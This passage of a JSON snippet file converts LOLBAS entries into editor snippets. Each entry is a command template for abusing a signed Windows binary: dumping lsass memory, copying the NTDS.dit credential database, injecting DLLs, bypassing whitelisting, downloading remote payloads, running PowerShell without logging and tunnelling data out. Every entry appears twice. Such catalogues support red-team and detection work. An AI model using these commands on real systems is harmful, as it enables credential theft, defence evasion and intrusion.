        "description": "Ldifde.exe is Creates, modifies, and deletes LDAP directory objects.. it can Import specified .ldf file into LDAP. If the file contains http-based attrval-spec such as thumbnailPhoto:< http://example.org/somefile.txt, the file will be downloaded into IE temp folder., requires  privilege, category: Download, it can be used for Download file from Internet."
    },
    "Mftrace.exe Local execution of cmd.exe as a subprocess of Mftrace.exe. (lolbas)": {
        "prefix": "Mftrace.exe",
        "body": [
            "Mftrace.exe is Trace log generation tool for Media Foundation Tools.. it can Launch specified executable as a subprocess of Mftrace.exe., requires  privilege, category: Execute, it can be used for Local execution of cmd.exe as a subprocess of Mftrace.exe..",
            "",
            "```sh",
            "Mftrace.exe {PATH:.exe}${0}",
            "```"
        ],
        "description": "Mftrace.exe is Trace log generation tool for Media Foundation Tools.. it can Launch specified executable as a subprocess of Mftrace.exe., requires  privilege, category: Execute, it can be used for Local execution of cmd.exe as a subprocess of Mftrace.exe.."
    },
    "lolbas Mftrace.exe Local execution of cmd.exe as a subprocess of Mftrace.exe.": {
        "prefix": "lolbas Mftrace.exe",
        "body": [
            "Mftrace.exe is Trace log generation tool for Media Foundation Tools.. it can Launch specified executable as a subprocess of Mftrace.exe., requires  privilege, category: Execute, it can be used for Local execution of cmd.exe as a subprocess of Mftrace.exe..",
            "",
            "```sh",
            "Mftrace.exe {PATH:.exe}${0}",
            "```"
        ],
        "description": "Mftrace.exe is Trace log generation tool for Media Foundation Tools.. it can Launch specified executable as a subprocess of Mftrace.exe., requires  privilege, category: Execute, it can be used for Local execution of cmd.exe as a subprocess of Mftrace.exe.."
    },
    "DumpMinitool.exe Create memory dump and parse it offline (lolbas)": {
        "prefix": "DumpMinitool.exe",
        "body": [
            "DumpMinitool.exe is Dump tool part Visual Studio 2022. it can Creates a memory dump of the lsass process, requires  privilege, category: Dump, it can be used for Create memory dump and parse it offline.",
            "",
            "```sh",
            "DumpMinitool.exe --file {PATH_ABSOLUTE} --processId 1132 --dumpType Full${0}",
            "```"
        ],
        "description": "DumpMinitool.exe is Dump tool part Visual Studio 2022. it can Creates a memory dump of the lsass process, requires  privilege, category: Dump, it can be used for Create memory dump and parse it offline."
    },
    "lolbas DumpMinitool.exe Create memory dump and parse it offline": {
        "prefix": "lolbas DumpMinitool.exe",
        "body": [
            "DumpMinitool.exe is Dump tool part Visual Studio 2022. it can Creates a memory dump of the lsass process, requires  privilege, category: Dump, it can be used for Create memory dump and parse it offline.",
            "",
            "```sh",
            "DumpMinitool.exe --file {PATH_ABSOLUTE} --processId 1132 --dumpType Full${0}",
            "```"
        ],
        "description": "DumpMinitool.exe is Dump tool part Visual Studio 2022. it can Creates a memory dump of the lsass process, requires  privilege, category: Dump, it can be used for Create memory dump and parse it offline."
    },
    "Tracker.exe Injection of locally stored DLL file into target process. (lolbas)": {
        "prefix": "Tracker.exe",
        "body": [
            "Tracker.exe is Tool included with Microsoft .Net Framework.. it can Use tracker.exe to proxy execution of an arbitrary DLL into another process. Since tracker.exe is also signed it can be used to bypass application whitelisting solutions., requires  privilege, category: AWL Bypass, it can be used for Injection of locally stored DLL file into target process..",
            "",
            "```sh",
            "Tracker.exe /d {PATH:.dll} /c C:\\Windows\\write.exe${0}",
            "```"
        ],
        "description": "Tracker.exe is Tool included with Microsoft .Net Framework.. it can Use tracker.exe to proxy execution of an arbitrary DLL into another process. Since tracker.exe is also signed it can be used to bypass application whitelisting solutions., requires  privilege, category: AWL Bypass, it can be used for Injection of locally stored DLL file into target process.."
    },
    "lolbas Tracker.exe Injection of locally stored DLL file into target process.": {
        "prefix": "lolbas Tracker.exe",
        "body": [
            "Tracker.exe is Tool included with Microsoft .Net Framework.. it can Use tracker.exe to proxy execution of an arbitrary DLL into another process. Since tracker.exe is also signed it can be used to bypass application whitelisting solutions., requires  privilege, category: AWL Bypass, it can be used for Injection of locally stored DLL file into target process..",
            "",
            "```sh",
            "Tracker.exe /d {PATH:.dll} /c C:\\Windows\\write.exe${0}",
            "```"
        ],
        "description": "Tracker.exe is Tool included with Microsoft .Net Framework.. it can Use tracker.exe to proxy execution of an arbitrary DLL into another process. Since tracker.exe is also signed it can be used to bypass application whitelisting solutions., requires  privilege, category: AWL Bypass, it can be used for Injection of locally stored DLL file into target process.."
    },
    "VSDiagnostics.exe Proxy execution of binary (lolbas)": {
        "prefix": "VSDiagnostics.exe",
        "body": [
            "VSDiagnostics.exe is Command-line tool used for performing diagnostics.. it can Starts a collection session with sessionID 1 and calls kernelbase.CreateProcessW to launch specified executable., requires  privilege, category: Execute, it can be used for Proxy execution of binary.",
            "",
            "```sh",
            "VSDiagnostics.exe start 1 /launch:{PATH:.exe}${0}",
            "```"
        ],
        "description": "VSDiagnostics.exe is Command-line tool used for performing diagnostics.. it can Starts a collection session with sessionID 1 and calls kernelbase.CreateProcessW to launch specified executable., requires  privilege, category: Execute, it can be used for Proxy execution of binary."
    },
    "lolbas VSDiagnostics.exe Proxy execution of binary": {
        "prefix": "lolbas VSDiagnostics.exe",
        "body": [
            "VSDiagnostics.exe is Command-line tool used for performing diagnostics.. it can Starts a collection session with sessionID 1 and calls kernelbase.CreateProcessW to launch specified executable., requires  privilege, category: Execute, it can be used for Proxy execution of binary.",
            "",
            "```sh",
            "VSDiagnostics.exe start 1 /launch:{PATH:.exe}${0}",
            "```"
        ],
        "description": "VSDiagnostics.exe is Command-line tool used for performing diagnostics.. it can Starts a collection session with sessionID 1 and calls kernelbase.CreateProcessW to launch specified executable., requires  privilege, category: Execute, it can be used for Proxy execution of binary."
    },
    "VSDiagnostics.exe Proxy execution of binary with arguments (lolbas)": {
        "prefix": "VSDiagnostics.exe",
        "body": [
            "VSDiagnostics.exe is Command-line tool used for performing diagnostics.. it can Starts a collection session with sessionID 2 and calls kernelbase.CreateProcessW to launch specified executable. Arguments specified in launchArgs are passed to CreateProcessW., requires  privilege, category: Execute, it can be used for Proxy execution of binary with arguments.",
            "",
            "```sh",
            "VSDiagnostics.exe start 2 /launch:{PATH:.exe} /launchArgs:\"{CMD:args}\"${0}",
            "```"
        ],
        "description": "VSDiagnostics.exe is Command-line tool used for performing diagnostics.. it can Starts a collection session with sessionID 2 and calls kernelbase.CreateProcessW to launch specified executable. Arguments specified in launchArgs are passed to CreateProcessW., requires  privilege, category: Execute, it can be used for Proxy execution of binary with arguments."
    },
    "lolbas VSDiagnostics.exe Proxy execution of binary with arguments": {
        "prefix": "lolbas VSDiagnostics.exe",
        "body": [
            "VSDiagnostics.exe is Command-line tool used for performing diagnostics.. it can Starts a collection session with sessionID 2 and calls kernelbase.CreateProcessW to launch specified executable. Arguments specified in launchArgs are passed to CreateProcessW., requires  privilege, category: Execute, it can be used for Proxy execution of binary with arguments.",
            "",
            "```sh",
            "VSDiagnostics.exe start 2 /launch:{PATH:.exe} /launchArgs:\"{CMD:args}\"${0}",
            "```"
        ],
        "description": "VSDiagnostics.exe is Command-line tool used for performing diagnostics.. it can Starts a collection session with sessionID 2 and calls kernelbase.CreateProcessW to launch specified executable. Arguments specified in launchArgs are passed to CreateProcessW., requires  privilege, category: Execute, it can be used for Proxy execution of binary with arguments."
    },
    "Dotnet.exe Execute code bypassing AWL (lolbas)": {
        "prefix": "Dotnet.exe",
        "body": [
            "Dotnet.exe is dotnet.exe comes with .NET Framework. it can dotnet.exe with msbuild (SDK Version) will execute unsigned code, requires  privilege, category: AWL Bypass, it can be used for Execute code bypassing AWL.",
            "",
            "```sh",
            "dotnet.exe msbuild {PATH:.csproj}${0}",
            "```"
        ],
        "description": "Dotnet.exe is dotnet.exe comes with .NET Framework. it can dotnet.exe with msbuild (SDK Version) will execute unsigned code, requires  privilege, category: AWL Bypass, it can be used for Execute code bypassing AWL."
    },
    "lolbas Dotnet.exe Execute code bypassing AWL": {
        "prefix": "lolbas Dotnet.exe",
        "body": [
            "Dotnet.exe is dotnet.exe comes with .NET Framework. it can dotnet.exe with msbuild (SDK Version) will execute unsigned code, requires  privilege, category: AWL Bypass, it can be used for Execute code bypassing AWL.",
            "",
            "```sh",
            "dotnet.exe msbuild {PATH:.csproj}${0}",
            "```"
        ],
        "description": "Dotnet.exe is dotnet.exe comes with .NET Framework. it can dotnet.exe with msbuild (SDK Version) will execute unsigned code, requires  privilege, category: AWL Bypass, it can be used for Execute code bypassing AWL."
    },
    "Dotnet.exe Execute DLL (lolbas)": {
        "prefix": "Dotnet.exe",
        "body": [
            "Dotnet.exe is dotnet.exe comes with .NET Framework. it can dotnet.exe will execute any DLL., requires  privilege, category: Execute, it can be used for Execute DLL.",
            "",
            "```sh",
            "dotnet.exe {PATH:.dll}${0}",
            "```"
        ],
        "description": "Dotnet.exe is dotnet.exe comes with .NET Framework. it can dotnet.exe will execute any DLL., requires  privilege, category: Execute, it can be used for Execute DLL."
    },
    "lolbas Dotnet.exe Execute DLL": {
        "prefix": "lolbas Dotnet.exe",
        "body": [
            "Dotnet.exe is dotnet.exe comes with .NET Framework. it can dotnet.exe will execute any DLL., requires  privilege, category: Execute, it can be used for Execute DLL.",
            "",
            "```sh",
            "dotnet.exe {PATH:.dll}${0}",
            "```"
        ],
        "description": "Dotnet.exe is dotnet.exe comes with .NET Framework. it can dotnet.exe will execute any DLL., requires  privilege, category: Execute, it can be used for Execute DLL."
    },
    "Dotnet.exe Execute arbitrary F# code (lolbas)": {
        "prefix": "Dotnet.exe",
        "body": [
            "Dotnet.exe is dotnet.exe comes with .NET Framework. it can dotnet.exe will open a console which allows for the execution of arbitrary F# commands, requires  privilege, category: Execute, it can be used for Execute arbitrary F# code.",
            "",
            "```sh",
            "dotnet.exe fsi${0}",
            "```"
        ],
        "description": "Dotnet.exe is dotnet.exe comes with .NET Framework. it can dotnet.exe will open a console which allows for the execution of arbitrary F# commands, requires  privilege, category: Execute, it can be used for Execute arbitrary F# code."
    },
    "lolbas Dotnet.exe Execute arbitrary F# code": {
        "prefix": "lolbas Dotnet.exe",
        "body": [
            "Dotnet.exe is dotnet.exe comes with .NET Framework. it can dotnet.exe will open a console which allows for the execution of arbitrary F# commands, requires  privilege, category: Execute, it can be used for Execute arbitrary F# code.",
            "",
            "```sh",
            "dotnet.exe fsi${0}",
            "```"
        ],
        "description": "Dotnet.exe is dotnet.exe comes with .NET Framework. it can dotnet.exe will open a console which allows for the execution of arbitrary F# commands, requires  privilege, category: Execute, it can be used for Execute arbitrary F# code."
    },
    "Createdump.exe Dump process memory contents using PID. (lolbas)": {
        "prefix": "Createdump.exe",
        "body": [
            "Createdump.exe is Microsoft .NET Runtime Crash Dump Generator (included in .NET Core). it can Dump process by PID and create a minidump file. If \"-f dump.dmp\" is not specified, the file is created as '%TEMP%\\dump.%p.dmp' where %p is the PID of the target process., requires  privilege, category: Dump, it can be used for Dump process memory contents using PID..",
            "",
            "```sh",
            "createdump.exe -n -f {PATH:.dmp} {PID}${0}",
            "```"
        ],
        "description": "Createdump.exe is Microsoft .NET Runtime Crash Dump Generator (included in .NET Core). it can Dump process by PID and create a minidump file. If \"-f dump.dmp\" is not specified, the file is created as '%TEMP%\\dump.%p.dmp' where %p is the PID of the target process., requires  privilege, category: Dump, it can be used for Dump process memory contents using PID.."
    },
    "lolbas Createdump.exe Dump process memory contents using PID.": {
        "prefix": "lolbas Createdump.exe",
        "body": [
            "Createdump.exe is Microsoft .NET Runtime Crash Dump Generator (included in .NET Core). it can Dump process by PID and create a minidump file. If \"-f dump.dmp\" is not specified, the file is created as '%TEMP%\\dump.%p.dmp' where %p is the PID of the target process., requires  privilege, category: Dump, it can be used for Dump process memory contents using PID..",
            "",
            "```sh",
            "createdump.exe -n -f {PATH:.dmp} {PID}${0}",
            "```"
        ],
        "description": "Createdump.exe is Microsoft .NET Runtime Crash Dump Generator (included in .NET Core). it can Dump process by PID and create a minidump file. If \"-f dump.dmp\" is not specified, the file is created as '%TEMP%\\dump.%p.dmp' where %p is the PID of the target process., requires  privilege, category: Dump, it can be used for Dump process memory contents using PID.."
    },
    "VSIISExeLauncher.exe Execute any binary with given arguments. (lolbas)": {
        "prefix": "VSIISExeLauncher.exe",
        "body": [
            "VSIISExeLauncher.exe is Binary will execute specified binary. Part of VS/VScode installation.. it can The above binary will execute other binary., requires  privilege, category: Execute, it can be used for Execute any binary with given arguments..",
            "",
            "```sh",
            "VSIISExeLauncher.exe -p {PATH:.exe} -a \"{CMD:args}\"${0}",
            "```"
        ],
        "description": "VSIISExeLauncher.exe is Binary will execute specified binary. Part of VS/VScode installation.. it can The above binary will execute other binary., requires  privilege, category: Execute, it can be used for Execute any binary with given arguments.."
    },
    "lolbas VSIISExeLauncher.exe Execute any binary with given arguments.": {
        "prefix": "lolbas VSIISExeLauncher.exe",
        "body": [
            "VSIISExeLauncher.exe is Binary will execute specified binary. Part of VS/VScode installation.. it can The above binary will execute other binary., requires  privilege, category: Execute, it can be used for Execute any binary with given arguments..",
            "",
            "```sh",
            "VSIISExeLauncher.exe -p {PATH:.exe} -a \"{CMD:args}\"${0}",
            "```"
        ],
        "description": "VSIISExeLauncher.exe is Binary will execute specified binary. Part of VS/VScode installation.. it can The above binary will execute other binary., requires  privilege, category: Execute, it can be used for Execute any binary with given arguments.."
    },
    "Microsoft.NodejsTools.PressAnyKey.exe Spawn a new process via Microsoft.NodejsTools.PressAnyKey.exe. (lolbas)": {
        "prefix": "Microsoft.NodejsTools.PressAnyKey.exe",
        "body": [
            "Microsoft.NodejsTools.PressAnyKey.exe is Part of the NodeJS Visual Studio tools.. it can Launch specified executable as a subprocess of Microsoft.NodejsTools.PressAnyKey.exe., requires  privilege, category: Execute, it can be used for Spawn a new process via Microsoft.NodejsTools.PressAnyKey.exe..",
            "",
            "```sh",
            "Microsoft.NodejsTools.PressAnyKey.exe normal 1 {PATH:.exe}${0}",
            "```"
        ],
        "description": "Microsoft.NodejsTools.PressAnyKey.exe is Part of the NodeJS Visual Studio tools.. it can Launch specified executable as a subprocess of Microsoft.NodejsTools.PressAnyKey.exe., requires  privilege, category: Execute, it can be used for Spawn a new process via Microsoft.NodejsTools.PressAnyKey.exe.."
    },
    "lolbas Microsoft.NodejsTools.PressAnyKey.exe Spawn a new process via Microsoft.NodejsTools.PressAnyKey.exe.": {
        "prefix": "lolbas Microsoft.NodejsTools.PressAnyKey.exe",
        "body": [
            "Microsoft.NodejsTools.PressAnyKey.exe is Part of the NodeJS Visual Studio tools.. it can Launch specified executable as a subprocess of Microsoft.NodejsTools.PressAnyKey.exe., requires  privilege, category: Execute, it can be used for Spawn a new process via Microsoft.NodejsTools.PressAnyKey.exe..",
            "",
            "```sh",
            "Microsoft.NodejsTools.PressAnyKey.exe normal 1 {PATH:.exe}${0}",
            "```"
        ],
        "description": "Microsoft.NodejsTools.PressAnyKey.exe is Part of the NodeJS Visual Studio tools.. it can Launch specified executable as a subprocess of Microsoft.NodejsTools.PressAnyKey.exe., requires  privilege, category: Execute, it can be used for Spawn a new process via Microsoft.NodejsTools.PressAnyKey.exe.."
    },
    "Devinit.exe Executes code from a (remote) MSI file. (lolbas)": {
        "prefix": "Devinit.exe",
        "body": [
            "Devinit.exe is Visual Studio 2019 tool. it can Downloads an MSI file to C:\\Windows\\Installer and then installs it., requires  privilege, category: Execute, it can be used for Executes code from a (remote) MSI file..",
            "",
            "```sh",
            "devinit.exe run -t msi-install -i {REMOTEURL:.msi}${0}",
            "```"
        ],
        "description": "Devinit.exe is Visual Studio 2019 tool. it can Downloads an MSI file to C:\\Windows\\Installer and then installs it., requires  privilege, category: Execute, it can be used for Executes code from a (remote) MSI file.."
    },
    "lolbas Devinit.exe Executes code from a (remote) MSI file.": {
        "prefix": "lolbas Devinit.exe",
        "body": [
            "Devinit.exe is Visual Studio 2019 tool. it can Downloads an MSI file to C:\\Windows\\Installer and then installs it., requires  privilege, category: Execute, it can be used for Executes code from a (remote) MSI file..",
            "",
            "```sh",
            "devinit.exe run -t msi-install -i {REMOTEURL:.msi}${0}",
            "```"
        ],
        "description": "Devinit.exe is Visual Studio 2019 tool. it can Downloads an MSI file to C:\\Windows\\Installer and then installs it., requires  privilege, category: Execute, it can be used for Executes code from a (remote) MSI file.."
    },
    "xsd.exe It will download a remote payload and place it in INetCache (lolbas)": {
        "prefix": "xsd.exe",
        "body": [
            "xsd.exe is XML Schema Definition Tool included with the Windows Software Development Kit (SDK).. it can Downloads payload from remote server, requires  privilege, category: Download, it can be used for It will download a remote payload and place it in INetCache.",
            "",
            "```sh",
            "xsd.exe {REMOTEURL}${0}",
            "```"
        ],
        "description": "xsd.exe is XML Schema Definition Tool included with the Windows Software Development Kit (SDK).. it can Downloads payload from remote server, requires  privilege, category: Download, it can be used for It will download a remote payload and place it in INetCache."
    },
    "lolbas xsd.exe It will download a remote payload and place it in INetCache": {
        "prefix": "lolbas xsd.exe",
        "body": [
            "xsd.exe is XML Schema Definition Tool included with the Windows Software Development Kit (SDK).. it can Downloads payload from remote server, requires  privilege, category: Download, it can be used for It will download a remote payload and place it in INetCache.",
            "",
            "```sh",
            "xsd.exe {REMOTEURL}${0}",
            "```"
        ],
        "description": "xsd.exe is XML Schema Definition Tool included with the Windows Software Development Kit (SDK).. it can Downloads payload from remote server, requires  privilege, category: Download, it can be used for It will download a remote payload and place it in INetCache."
    },
    "SQLToolsPS.exe Execute PowerShell command. (lolbas)": {
        "prefix": "SQLToolsPS.exe",
        "body": [
            "SQLToolsPS.exe is Tool included with Microsoft SQL that loads SQL Server cmdlts. A replacement for sqlps.exe. Successor to sqlps.exe in SQL Server 2016+.. it can Run a SQL Server PowerShell mini-console without Module and ScriptBlock Logging., requires  privilege, category: Execute, it can be used for Execute PowerShell command..",
            "",
            "```sh",
            "SQLToolsPS.exe -noprofile -command Start-Process {PATH:.exe}${0}",
            "```"
        ],
        "description": "SQLToolsPS.exe is Tool included with Microsoft SQL that loads SQL Server cmdlts. A replacement for sqlps.exe. Successor to sqlps.exe in SQL Server 2016+.. it can Run a SQL Server PowerShell mini-console without Module and ScriptBlock Logging., requires  privilege, category: Execute, it can be used for Execute PowerShell command.."
    },
    "lolbas SQLToolsPS.exe Execute PowerShell command.": {
        "prefix": "lolbas SQLToolsPS.exe",
        "body": [
            "SQLToolsPS.exe is Tool included with Microsoft SQL that loads SQL Server cmdlts. A replacement for sqlps.exe. Successor to sqlps.exe in SQL Server 2016+.. it can Run a SQL Server PowerShell mini-console without Module and ScriptBlock Logging., requires  privilege, category: Execute, it can be used for Execute PowerShell command..",
            "",
            "```sh",
            "SQLToolsPS.exe -noprofile -command Start-Process {PATH:.exe}${0}",
            "```"
        ],
        "description": "SQLToolsPS.exe is Tool included with Microsoft SQL that loads SQL Server cmdlts. A replacement for sqlps.exe. Successor to sqlps.exe in SQL Server 2016+.. it can Run a SQL Server PowerShell mini-console without Module and ScriptBlock Logging., requires  privilege, category: Execute, it can be used for Execute PowerShell command.."
    },
    "dsdbutil.exe Snapshoting of Active Directory NTDS.dit database (lolbas)": {
        "prefix": "dsdbutil.exe",
        "body": [
            "dsdbutil.exe is Dsdbutil is a command-line tool that is built into Windows Server. It is available if you have the AD LDS server role installed. Can be used as a command line utility to export Active Directory.. it can dsdbutil supports VSS snapshot creation, requires  privilege, category: Dump, it can be used for Snapshoting of Active Directory NTDS.dit database.",
            "",
            "```sh",
            "dsdbutil.exe \"activate instance ntds\" \"snapshot\" \"create\" \"quit\" \"quit\"${0}",
            "```"
        ],
        "description": "dsdbutil.exe is Dsdbutil is a command-line tool that is built into Windows Server. It is available if you have the AD LDS server role installed. Can be used as a command line utility to export Active Directory.. it can dsdbutil supports VSS snapshot creation, requires  privilege, category: Dump, it can be used for Snapshoting of Active Directory NTDS.dit database."
    },
    "lolbas dsdbutil.exe Snapshoting of Active Directory NTDS.dit database": {
        "prefix": "lolbas dsdbutil.exe",
        "body": [
            "dsdbutil.exe is Dsdbutil is a command-line tool that is built into Windows Server. It is available if you have the AD LDS server role installed. Can be used as a command line utility to export Active Directory.. it can dsdbutil supports VSS snapshot creation, requires  privilege, category: Dump, it can be used for Snapshoting of Active Directory NTDS.dit database.",
            "",
            "```sh",
            "dsdbutil.exe \"activate instance ntds\" \"snapshot\" \"create\" \"quit\" \"quit\"${0}",
            "```"
        ],
        "description": "dsdbutil.exe is Dsdbutil is a command-line tool that is built into Windows Server. It is available if you have the AD LDS server role installed. Can be used as a command line utility to export Active Directory.. it can dsdbutil supports VSS snapshot creation, requires  privilege, category: Dump, it can be used for Snapshoting of Active Directory NTDS.dit database."
    },
    "dsdbutil.exe Mounting the snapshot to access the ntds.dit with copy c:\\[Snap Volume]\\windows\\ntds\\ntds.dit c:\\users\\administrator\\desktop\\ntds.dit.bak (lolbas)": {
        "prefix": "dsdbutil.exe",
        "body": [
            "dsdbutil.exe is Dsdbutil is a command-line tool that is built into Windows Server. It is available if you have the AD LDS server role installed. Can be used as a command line utility to export Active Directory.. it can Mounting the snapshot with its GUID, requires  privilege, category: Dump, it can be used for Mounting the snapshot to access the ntds.dit with copy c:\\[Snap Volume]\\windows\\ntds\\ntds.dit c:\\users\\administrator\\desktop\\ntds.dit.bak.",
            "",
            "```sh",
            "dsdbutil.exe \"activate instance ntds\" \"snapshot\" \"mount {GUID}\" \"quit\" \"quit\"${0}",
            "```"
        ],
        "description": "dsdbutil.exe is Dsdbutil is a command-line tool that is built into Windows Server. It is available if you have the AD LDS server role installed. Can be used as a command line utility to export Active Directory.. it can Mounting the snapshot with its GUID, requires  privilege, category: Dump, it can be used for Mounting the snapshot to access the ntds.dit with copy c:\\[Snap Volume]\\windows\\ntds\\ntds.dit c:\\users\\administrator\\desktop\\ntds.dit.bak."
    },
    "lolbas dsdbutil.exe Mounting the snapshot to access the ntds.dit with copy c:\\[Snap Volume]\\windows\\ntds\\ntds.dit c:\\users\\administrator\\desktop\\ntds.dit.bak": {
        "prefix": "lolbas dsdbutil.exe",
        "body": [
            "dsdbutil.exe is Dsdbutil is a command-line tool that is built into Windows Server. It is available if you have the AD LDS server role installed. Can be used as a command line utility to export Active Directory.. it can Mounting the snapshot with its GUID, requires  privilege, category: Dump, it can be used for Mounting the snapshot to access the ntds.dit with copy c:\\[Snap Volume]\\windows\\ntds\\ntds.dit c:\\users\\administrator\\desktop\\ntds.dit.bak.",
            "",
            "```sh",
            "dsdbutil.exe \"activate instance ntds\" \"snapshot\" \"mount {GUID}\" \"quit\" \"quit\"${0}",
            "```"
        ],
        "description": "dsdbutil.exe is Dsdbutil is a command-line tool that is built into Windows Server. It is available if you have the AD LDS server role installed. Can be used as a command line utility to export Active Directory.. it can Mounting the snapshot with its GUID, requires  privilege, category: Dump, it can be used for Mounting the snapshot to access the ntds.dit with copy c:\\[Snap Volume]\\windows\\ntds\\ntds.dit c:\\users\\administrator\\desktop\\ntds.dit.bak."
    },
    "dsdbutil.exe Deletes the snapshot (lolbas)": {
        "prefix": "dsdbutil.exe",
        "body": [
            "dsdbutil.exe is Dsdbutil is a command-line tool that is built into Windows Server. It is available if you have the AD LDS server role installed. Can be used as a command line utility to export Active Directory.. it can Deletes the mount of the snapshot, requires  privilege, category: Dump, it can be used for Deletes the snapshot.",
            "",
            "```sh",
            "dsdbutil.exe \"activate instance ntds\" \"snapshot\" \"delete {GUID}\" \"quit\" \"quit\"${0}",
            "```"
        ],
        "description": "dsdbutil.exe is Dsdbutil is a command-line tool that is built into Windows Server. It is available if you have the AD LDS server role installed. Can be used as a command line utility to export Active Directory.. it can Deletes the mount of the snapshot, requires  privilege, category: Dump, it can be used for Deletes the snapshot."
    },
    "lolbas dsdbutil.exe Deletes the snapshot": {
        "prefix": "lolbas dsdbutil.exe",
        "body": [
            "dsdbutil.exe is Dsdbutil is a command-line tool that is built into Windows Server. It is available if you have the AD LDS server role installed. Can be used as a command line utility to export Active Directory.. it can Deletes the mount of the snapshot, requires  privilege, category: Dump, it can be used for Deletes the snapshot.",
            "",
            "```sh",
            "dsdbutil.exe \"activate instance ntds\" \"snapshot\" \"delete {GUID}\" \"quit\" \"quit\"${0}",
            "```"
        ],
        "description": "dsdbutil.exe is Dsdbutil is a command-line tool that is built into Windows Server. It is available if you have the AD LDS server role installed. Can be used as a command line utility to export Active Directory.. it can Deletes the mount of the snapshot, requires  privilege, category: Dump, it can be used for Deletes the snapshot."
    },
    "dsdbutil.exe Mounting the snapshot identifier 1 and accessing it with with copy c:\\[Snap Volume]\\windows\\ntds\\ntds.dit c:\\users\\administrator\\desktop\\ntds.dit.bak (lolbas)": {
        "prefix": "dsdbutil.exe",
        "body": [
            "dsdbutil.exe is Dsdbutil is a command-line tool that is built into Windows Server. It is available if you have the AD LDS server role installed. Can be used as a command line utility to export Active Directory.. it can Mounting with snapshot identifier, requires  privilege, category: Dump, it can be used for Mounting the snapshot identifier 1 and accessing it with with copy c:\\[Snap Volume]\\windows\\ntds\\ntds.dit c:\\users\\administrator\\desktop\\ntds.dit.bak.",
            "",
            "```sh",
            "dsdbutil.exe \"activate instance ntds\" \"snapshot\" \"create\" \"list all\" \"mount 1\" \"quit\" \"quit\"${0}",
            "```"
        ],
        "description": "dsdbutil.exe is Dsdbutil is a command-line tool that is built into Windows Server. It is available if you have the AD LDS server role installed. Can be used as a command line utility to export Active Directory.. it can Mounting with snapshot identifier, requires  privilege, category: Dump, it can be used for Mounting the snapshot identifier 1 and accessing it with with copy c:\\[Snap Volume]\\windows\\ntds\\ntds.dit c:\\users\\administrator\\desktop\\ntds.dit.bak."
    },
    "lolbas dsdbutil.exe Mounting the snapshot identifier 1 and accessing it with with copy c:\\[Snap Volume]\\windows\\ntds\\ntds.dit c:\\users\\administrator\\desktop\\ntds.dit.bak": {
        "prefix": "lolbas dsdbutil.exe",
        "body": [
            "dsdbutil.exe is Dsdbutil is a command-line tool that is built into Windows Server. It is available if you have the AD LDS server role installed. Can be used as a command line utility to export Active Directory.. it can Mounting with snapshot identifier, requires  privilege, category: Dump, it can be used for Mounting the snapshot identifier 1 and accessing it with with copy c:\\[Snap Volume]\\windows\\ntds\\ntds.dit c:\\users\\administrator\\desktop\\ntds.dit.bak.",
            "",
            "```sh",
            "dsdbutil.exe \"activate instance ntds\" \"snapshot\" \"create\" \"list all\" \"mount 1\" \"quit\" \"quit\"${0}",
            "```"
        ],
        "description": "dsdbutil.exe is Dsdbutil is a command-line tool that is built into Windows Server. It is available if you have the AD LDS server role installed. Can be used as a command line utility to export Active Directory.. it can Mounting with snapshot identifier, requires  privilege, category: Dump, it can be used for Mounting the snapshot identifier 1 and accessing it with with copy c:\\[Snap Volume]\\windows\\ntds\\ntds.dit c:\\users\\administrator\\desktop\\ntds.dit.bak."
    },
    "dsdbutil.exe deletes the snapshot (lolbas)": {
        "prefix": "dsdbutil.exe",
        "body": [
            "dsdbutil.exe is Dsdbutil is a command-line tool that is built into Windows Server. It is available if you have the AD LDS server role installed. Can be used as a command line utility to export Active Directory.. it can Deletes the mount of the snapshot, requires  privilege, category: Dump, it can be used for deletes the snapshot.",
            "",
            "```sh",
            "dsdbutil.exe \"activate instance ntds\" \"snapshot\" \"list all\" \"delete 1\" \"quit\" \"quit\"${0}",
            "```"
        ],
        "description": "dsdbutil.exe is Dsdbutil is a command-line tool that is built into Windows Server. It is available if you have the AD LDS server role installed. Can be used as a command line utility to export Active Directory.. it can Deletes the mount of the snapshot, requires  privilege, category: Dump, it can be used for deletes the snapshot."
    },
    "lolbas dsdbutil.exe deletes the snapshot": {
        "prefix": "lolbas dsdbutil.exe",
        "body": [
            "dsdbutil.exe is Dsdbutil is a command-line tool that is built into Windows Server. It is available if you have the AD LDS server role installed. Can be used as a command line utility to export Active Directory.. it can Deletes the mount of the snapshot, requires  privilege, category: Dump, it can be used for deletes the snapshot.",
            "",
            "```sh",
            "dsdbutil.exe \"activate instance ntds\" \"snapshot\" \"list all\" \"delete 1\" \"quit\" \"quit\"${0}",
            "```"
        ],
        "description": "dsdbutil.exe is Dsdbutil is a command-line tool that is built into Windows Server. It is available if you have the AD LDS server role installed. Can be used as a command line utility to export Active Directory.. it can Deletes the mount of the snapshot, requires  privilege, category: Dump, it can be used for deletes the snapshot."
    },
    "devtunnel.exe Download Files, Upload Files, Data Exfiltration (lolbas)": {
        "prefix": "devtunnel.exe",
        "body": [
            "devtunnel.exe is Binary to enable forwarded ports on windows operating systems.. it can Enabling a forwarded port for locally hosted service at port 8080 to be exposed on the internet., requires  privilege, category: Download, it can be used for Download Files, Upload Files, Data Exfiltration.",
            "",
            "```sh",
            "devtunnel.exe host -p 8080${0}",
            "```"
        ],
        "description": "devtunnel.exe is Binary to enable forwarded ports on windows operating systems.. it can Enabling a forwarded port for locally hosted service at port 8080 to be exposed on the internet., requires  privilege, category: Download, it can be used for Download Files, Upload Files, Data Exfiltration."
    },
    "lolbas devtunnel.exe Download Files, Upload Files, Data Exfiltration": {
        "prefix": "lolbas devtunnel.exe",
        "body": [
            "devtunnel.exe is Binary to enable forwarded ports on windows operating systems.. it can Enabling a forwarded port for locally hosted service at port 8080 to be exposed on the internet., requires  privilege, category: Download, it can be used for Download Files, Upload Files, Data Exfiltration.",
            "",
            "```sh",
            "devtunnel.exe host -p 8080${0}",
            "```"
        ],
        "description": "devtunnel.exe is Binary to enable forwarded ports on windows operating systems.. it can Enabling a forwarded port for locally hosted service at port 8080 to be exposed on the internet., requires  privilege, category: Download, it can be used for Download Files, Upload Files, Data Exfiltration."
    },
    "Dxcap.exe Local execution of a process as a subprocess of dxcap.exe (lolbas)": {
        "prefix": "Dxcap.exe",
        "body": [
            "Dxcap.exe is DirectX diagnostics/debugger included with Visual Studio.. it can Launch specified executable as a subprocess of dxcap.exe. Note that you should have write permissions in the current working directory for the command to succeed; alternatively, add '-file c:\\path\\to\\writable\\location.ext' as first argument., requires  privilege, category: Execute, it can be used for Local execution of a process as a subprocess of dxcap.exe.",
            "",
            "```sh",
            "Dxcap.exe -c {PATH_ABSOLUTE:.exe}${0}",
